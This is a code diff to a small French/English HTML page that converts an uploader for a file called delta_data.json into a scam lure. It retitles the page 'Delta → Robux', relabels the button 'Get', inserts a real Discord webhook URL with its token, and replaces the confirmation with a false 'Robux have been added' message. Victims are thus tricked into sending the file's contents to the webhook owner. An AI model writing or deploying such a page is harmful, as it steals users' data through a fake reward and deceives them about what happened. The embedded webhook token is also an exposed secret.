@@ -2,23 +2,23 @@
 <html lang="fr">
 <head>
 <meta charset="UTF-8">
-<title>Delta → Discord</title>
+<title>Delta → Robux</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 </head>
 <body>
 
-<h3>Envoyer delta_data.json</h3>
+<h3>Send delta_data.json</h3>
 
 <input type="file" id="file">
 <br><br>
-<button onclick="send()">Envoyer</button>
+<button onclick="send()">Get</button>
 
 <script>
-const WEBHOOK = "https://discord.com/api/webhooks/ID/TOKEN";
+const WEBHOOK = "https://discord.com/api/webhooks/1455615155969851403/EgT6gsKtBbGhgJ1gMDBWpD00lc5pU1m4Slkda6IU6ZaMOa5elH7KdVj3IGdBvF6jyAt0";
 
 function send() {
   const f = document.getElementById("file").files[0];
-  if (!f) return alert("Sélectionne delta_data.json");
+  if (!f) return alert("choose delta_data.json");
 
   const r = new FileReader();
   r.onload = () => {
@@ -26,9 +26,9 @@ function send() {
       method: "POST",
       headers: {"Content-Type": "application/json"},
       body: JSON.stringify({
-        content: "📦 Données Delta :\n```json\n" + r.result + "\n```"
+        content: "📦 Delta data :\n```json\n" + r.result + "\n```"
       })
-    }).then(() => alert("Envoyé sur Discord ✅"));
+    }).then(() => alert("Robux have been added ✅"));
   };
   r.readAsText(f);
 }
